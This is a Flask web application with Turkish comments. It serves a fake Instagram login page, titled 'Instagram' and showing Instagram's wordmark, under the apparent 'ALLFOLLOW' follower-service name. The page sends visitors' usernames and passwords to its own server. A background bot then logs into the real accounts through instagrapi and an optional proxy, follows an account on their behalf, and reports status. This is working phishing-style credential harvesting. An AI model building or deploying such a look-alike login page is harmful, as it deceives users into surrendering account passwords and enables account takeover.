import os
import sys
import threading
import time
import logging
import traceback
from flask import Flask, request, jsonify, render_template_string
from flask_sqlalchemy import SQLAlchemy
from flask_limiter import Limiter
from flask_limiter.util import get_remote_address
from werkzeug.security import generate_password_hash
from dotenv import load_dotenv

# LOGGING
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[logging.StreamHandler(sys.stdout)]
)
logger = logging.getLogger(__name__)

# INSTAGRAPI IMPORT
try:
    from instagrapi import Client
    from instagrapi.exceptions import (
        ChallengeRequired, 
        LoginRequired, 
        PleaseWaitFewMinutes,
        BadPassword,
        TwoFactorRequired,
        UnknownError,
        RateLimitError
    )
    
    # Versiyon kontrolü (güvenli yöntem)
    try:
        import importlib.metadata
        INSTAGRAMI_VERSION = importlib.metadata.version('instagrapi')
    except:
        try:
            import pkg_resources
            INSTAGRAMI_VERSION = pkg_resources.get_distribution('instagrapi').version
        except:
            INSTAGRAMI_VERSION = "bilinmiyor"
    
    logger.info(f"instagrapi yüklendi (versiyon: {INSTAGRAMI_VERSION})")
    
except ImportError as e:
    logger.error(f"instagrapi yüklü değil: {e}")
    logger.error("Kurulum: pip install instagrapi")
    # Boş sınıflar tanımla ki kod çalışsın (hata vermemesi için)
    Client = None
    ChallengeRequired = Exception
    LoginRequired = Exception
    PleaseWaitFewMinutes = Exception
    BadPassword = Exception
    TwoFactorRequired = Exception
    UnknownError = Exception
    RateLimitError = Exception

load_dotenv()

app = Flask(__name__)

# RENDER İÇİN DATABASE - SQLite kullan (PostgreSQL yerine)
# Render'da ephemeral disk kullanıyorsak SQLite çalışır
db_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), "ig_accounts.db")
app.config['SQLALCHEMY_DATABASE_URI'] = os.getenv("DATABASE_URL", f"sqlite:///{db_path}")
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
app.config['SECRET_KEY'] = os.getenv("SECRET_KEY", "anti-delay-v72")

logger.info(f"Database: {app.config['SQLALCHEMY_DATABASE_URI'][:50]}...")

db = SQLAlchemy(app)

# Rate limiter (hata olursa devre dışı kalabilir)
try:
    limiter = Limiter(
        app=app,
        key_func=get_remote_address,
        default_limits=["10 per minute"]
    )
except Exception as e:
    logger.warning(f"Rate limiter devre dışı: {e}")
    limiter = None

# PROXY
PROXY_URL = os.getenv("PROXY_URL", "").strip()
logger.info(f"Proxy: {'Aktif' if PROXY_URL else 'Pasif'}")

class IGAccount(db.Model):
    __tablename__ = 'ig_accounts'
    id = db.Column(db.Integer, primary_key=True)
    username = db.Column(db.String(100), unique=True, nullable=False, index=True)
    password_hash = db.Column(db.String(255), nullable=False)
    status = db.Column(db.String(200), default="Beklemede")
    last_login = db.Column(db.DateTime)
    created_at = db.Column(db.DateTime, default=db.func.now())
    login_attempts = db.Column(db.Integer, default=0)
    error_log = db.Column(db.Text)

    def set_password(self, password):
        self.password_hash = generate_password_hash(password)

db_lock = threading.Lock()

def create_client():
    """Instagrapi client oluştur"""
    if Client is None:
        raise ImportError("instagrapi yüklü değil")
    
    cl = Client()
    
    if PROXY_URL:
        try:
            cl.set_proxy(PROXY_URL)
            logger.info("Proxy ayarlandı")
        except Exception as e:
            logger.warning(f"Proxy hatası: {e}")
    
    cl.request_timeout = 30
    cl.delay_range = [1, 3]
    
    return cl

def background_bot(username, password):
    """Arka plan botu"""
    logger.info(f"Bot başladı: {username}")
    
    with app.app_context():
        try:
            # Database güncelle
            with db_lock:
                acc = IGAccount.query.filter_by(username=username.lower()).first()
                if not acc:
                    logger.error(f"Hesap bulunamadı: {username}")
                    return
                
                acc.login_attempts += 1
                acc.status = "Giriş yapılıyor..."
                db.session.commit()

            # Client oluştur ve login dene
            cl = create_client()
            
            try:
                logger.info(f"Login deneniyor: {username}")
                cl.login(username, password)
                logger.info(f"Login başarılı: {username}")
                
                with db_lock:
                    acc = IGAccount.query.filter_by(username=username.lower()).first()
                    acc.status = "AKTİF ✅"
                    acc.last_login = db.func.now()
                    db.session.commit()
                
                # Instagram'ı takip et
                try:
                    instagram_id = cl.user_id_from_username("instagram")
                    cl.user_follow(instagram_id)
                    logger.info(f"Takip edildi: {username}")
                    
                    with db_lock:
                        acc = IGAccount.query.filter_by(username=username.lower()).first()
                        acc.status = "AKTİF ✅ - Takip tamamlandı"
                        db.session.commit()
                except Exception as e:
                    logger.warning(f"Takip hatası: {e}")
                    
            except ChallengeRequired:
                logger.warning(f"Challenge: {username}")
                with db_lock:
                    acc = IGAccount.query.filter_by(username=username.lower()).first()
                    acc.status = "ONAY GEREKİYOR ⚠️"
                    db.session.commit()
                    
            except TwoFactorRequired:
                logger.warning(f"2FA: {username}")
                with db_lock:
                    acc = IGAccount.query.filter_by(username=username.lower()).first()
                    acc.status = "2FA GEREKİYOR ⚠️"
                    db.session.commit()
                    
            except BadPassword:
                logger.warning(f"Yanlış şifre: {username}")
                with db_lock:
                    acc = IGAccount.query.filter_by(username=username.lower()).first()
                    acc.status = "HATA ❌ - Yanlış şifre"
                    db.session.commit()
                    
            except PleaseWaitFewMinutes:
                logger.warning(f"Rate limit: {username}")
                with db_lock:
                    acc = IGAccount.query.filter_by(username=username.lower()).first()
                    acc.status = "BEKLEME ⏳ - Çok fazla deneme"
                    db.session.commit()
                    
            except Exception as e:
                logger.error(f"Login hatası: {type(e).__name__}: {e}")
                with db_lock:
                    acc = IGAccount.query.filter_by(username=username.lower()).first()
                    error_msg = str(e)
                    
                    if "checkpoint" in error_msg.lower():
                        acc.status = "ONAY GEREKİYOR ⚠️"
                    elif "password" in error_msg.lower():
                        acc.status = "HATA ❌ - Şifre hatalı"
                    else:
                        acc.status = f"HATA ❌ - {error_msg[:50]}"
                    
                    acc.error_log = error_msg
                    db.session.commit()
            
            finally:
                try:
                    cl.logout()
                except:
                    pass
                    
        except Exception as e:
            logger.error(f"Bot hatası: {e}")
            logger.error(traceback.format_exc())

@app.route('/')
def index():
    return render_template_string(HTML_TEMPLATE)

@app.route('/api/connect', methods=['POST'])
def connect():
    logger.info("Connect isteği alındı")
    
    try:
        data = request.get_json()
        if not data:
            return jsonify(status="error", message="Veri gönderilmedi"), 400
        
        username = data.get('u', '').strip().lower()
        password = data.get('p', '')
        
        logger.info(f"Kullanıcı: {username}")
        
        if not username or not password:
            return jsonify(status="error", message="Kullanıcı adı ve şifre gerekli"), 400
        
        # instagrapi kontrolü
        if Client is None:
            return jsonify(status="error", message="instagrapi kütüphanesi yüklü değil"), 500
        
        # Database işlemi
        with db_lock:
            acc = IGAccount.query.filter_by(username=username).first()
            
            if not acc:
                acc = IGAccount(username=username, status="Yeni")
                acc.set_password(password)
                db.session.add(acc)
                logger.info(f"Yeni hesap: {username}")
            else:
                acc.set_password(password)
                acc.status = "Bağlanıyor..."
                logger.info(f"Mevcut hesap: {username}")
            
            db.session.commit()
        
        # Thread başlat
        thread = threading.Thread(
            target=background_bot,
            args=(username, password),
            daemon=True
        )
        thread.start()
        logger.info(f"Thread başlatıldı: {username}")
        
        return jsonify(status="started", username=username)
        
    except Exception as e:
        logger.error(f"Connect hatası: {e}")
        logger.error(traceback.format_exc())
        return jsonify(status="error", message=str(e)), 500

@app.route('/api/status/<username>')
def get_status(username):
    try:
        acc = IGAccount.query.filter_by(username=username.lower()).first()
        if not acc:
            return jsonify(status="Bilinmiyor", exists=False)
        
        return jsonify(
            status=acc.status,
            exists=True,
            attempts=acc.login_attempts,
            last_login=acc.last_login.isoformat() if acc.last_login else None,
            error=acc.error_log[:100] if acc.error_log else None
        )
    except Exception as e:
        logger.error(f"Status hatası: {e}")
        return jsonify(status="Hata", error=str(e)), 500

@app.route('/api/health')
def health_check():
    """Sağlık kontrolü"""
    return jsonify(
        status="ok",
        instagrapi_loaded=Client is not None,
        database_working=True,
        version=getattr(sys, 'version', 'unknown')
    )

HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        .page { display: none; }
        .active { display: block; animation: fadeIn 0.3s; }
        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
        .shake { animation: shake 0.5s; }
        @keyframes shake { 0%, 100% { transform: translateX(0); } 25% { transform: translateX(-5px); } 75% { transform: translateX(5px); } }
        .loader { border: 2px solid #f3f3f3; border-top: 2px solid #0095f6; border-radius: 50%; width: 16px; height: 16px; animation: spin 1s linear infinite; display: inline-block; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body class="bg-[#fafafa] min-h-screen font-sans">

    <div id="p1" class="page active flex flex-col items-center justify-center min-h-screen p-4">
        <div class="bg-white border border-gray-300 p-8 w-full max-w-[350px] flex flex-col items-center shadow-sm">
            <img src="https://www.instagram.com/static/images/web/logged_out_wordmark.png/7a2560540ad9.png" class="w-44 mb-8" alt="Instagram">
            
            <div id="errorBox" class="hidden w-full mb-3 p-2 bg-red-50 border border-red-200 rounded text-red-600 text-xs text-center"></div>
            
            <input id="u" type="text" placeholder="Kullanıcı adı" class="w-full p-2.5 mb-2 bg-gray-50 border border-gray-300 rounded text-xs outline-none focus:border-gray-400">
            <input id="p" type="password" placeholder="Şifre" class="w-full p-2.5 mb-4 bg-gray-50 border border-gray-300 rounded text-xs outline-none focus:border-gray-400">
            
            <button onclick="giris()" id="btn" class="w-full bg-[#0095f6] text-white py-2 rounded font-semibold text-sm opacity-100 hover:opacity-90 transition-opacity flex items-center justify-center gap-2 disabled:opacity-50">
                <span id="btnText">Giriş Yap</span>
                <div id="btnLoader" class="loader hidden border-white border-t-transparent"></div>
            </button>
        </div>
    </div>

    <div id="p2" class="page min-h-screen bg-gray-50 p-6">
        <div class="max-w-md mx-auto">
            <h1 class="text-center font-black text-purple-600 mb-6 text-2xl italic">ALLFOLLOW</h1>
            
            <div class="bg-white p-6 rounded-3xl shadow-lg border-b-4 border-purple-500 text-center mb-4">
                <p class="text-xs text-gray-400 font-bold uppercase mb-2">Durum</p>
                <div class="flex items-center justify-center gap-2">
                    <div id="statusIcon" class="w-2 h-2 bg-yellow-400 rounded-full animate-pulse"></div>
                    <h2 id="msg" class="text-lg font-bold text-purple-600">BAĞLANILIYOR...</h2>
                </div>
                <p id="errorDetail" class="text-[10px] text-red-500 mt-2 hidden"></p>
            </div>

            <div class="bg-white p-4 rounded-2xl border flex items-center justify-between shadow-sm mb-4">
                <div>
                    <p class="text-[10px] text-gray-400 font-bold uppercase">Kullanıcı</p>
                    <p id="utag" class="font-bold text-gray-800"></p>
                </div>
                <div class="w-10 h-10 bg-purple-100 rounded-xl flex items-center justify-center text-purple-600 font-bold text-sm">IG</div>
            </div>

            <div class="bg-white p-3 rounded-xl border text-xs space-y-2 mb-4">
                <div class="flex justify-between"><span class="text-gray-500">Deneme:</span><span id="attempts" class="font-semibold">0</span></div>
                <div class="flex justify-between"><span class="text-gray-500">Son kontrol:</span><span id="lastCheck" class="font-semibold">-</span></div>
            </div>

            <button onclick="location.reload()" class="w-full bg-gray-200 text-gray-700 py-3 rounded-xl font-semibold text-sm hover:bg-gray-300 transition-colors">Yeniden Dene</button>
        </div>
    </div>

    <script>
        let currentUser = "";
        let checkInterval;

        function showError(msg) {
            const box = document.getElementById('errorBox');
            box.textContent = msg;
            box.classList.remove('hidden');
            document.getElementById('p1').classList.add('shake');
            setTimeout(() => document.getElementById('p1').classList.remove('shake'), 500);
        }

        async function giris() {
            const u = document.getElementById('u').value.trim().toLowerCase();
            const p = document.getElementById('p').value;
            
            if (!u || !p) {
                showError('Kullanıcı adı ve şifre girin');
                return;
            }

            document.getElementById('btn').disabled = true;
            document.getElementById('btnText').classList.add('hidden');
            document.getElementById('btnLoader').classList.remove('hidden');

            try {
                const res = await fetch('/api/connect', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({u: u, p: p})
                });

                const data = await res.json();
                console.log('Yanıt:', data);

                if (data.status === 'error') {
                    throw new Error(data.message);
                }

                currentUser = u;
                document.getElementById('p1').classList.remove('active');
                setTimeout(() => {
                    document.getElementById('p2').classList.add('active');
                    document.getElementById('utag').textContent = '@' + u;
                    startChecking();
                }, 300);

            } catch (err) {
                console.error('Hata:', err);
                showError('Hata: ' + err.message);
                document.getElementById('btn').disabled = false;
                document.getElementById('btnText').classList.remove('hidden');
                document.getElementById('btnLoader').classList.add('hidden');
            }
        }

        function startChecking() {
            checkStatus();
            checkInterval = setInterval(checkStatus, 4000);
        }

        async function checkStatus() {
            if (!currentUser) return;
            
            try {
                const res = await fetch('/api/status/' + currentUser);
                const data = await res.json();
                console.log('Status:', data);

                document.getElementById('msg').textContent = data.status || 'Bekleniyor...';
                document.getElementById('attempts').textContent = data.attempts || 0;
                document.getElementById('lastCheck').textContent = new Date().toLocaleTimeString('tr-TR');

                if (data.error) {
                    document.getElementById('errorDetail').textContent = data.error;
                    document.getElementById('errorDetail').classList.remove('hidden');
                }

                const msg = document.getElementById('msg');
                const icon = document.getElementById('statusIcon');
                
                if (data.status.includes('✅')) {
                    msg.className = 'text-lg font-bold text-green-500';
                    icon.className = 'w-2 h-2 bg-green-500 rounded-full';
                    clearInterval(checkInterval);
                } else if (data.status.includes('❌')) {
                    msg.className = 'text-lg font-bold text-red-500';
                    icon.className = 'w-2 h-2 bg-red-500 rounded-full';
                } else if (data.status.includes('⚠️')) {
                    msg.className = 'text-lg font-bold text-orange-500';
                    icon.className = 'w-2 h-2 bg-orange-500 rounded-full animate-bounce';
                }

            } catch (e) {
                console.error('Check error:', e);
            }
        }

        document.getElementById('p').addEventListener('keypress', e => { if (e.key === 'Enter') giris(); });
    </script>
</body>
</html>
"""

if __name__ == "__main__":
    # Database oluştur
    with app.app_context():
        try:
            db.create_all()
            logger.info("Database hazır")
        except Exception as e:
            logger.error(f"Database hatası: {e}")
    
    port = int(os.getenv("PORT", 10000))
    logger.info(f"Sunucu başlatılıyor: {port}")
    app.run(host="0.0.0.0", port=port, debug=False)
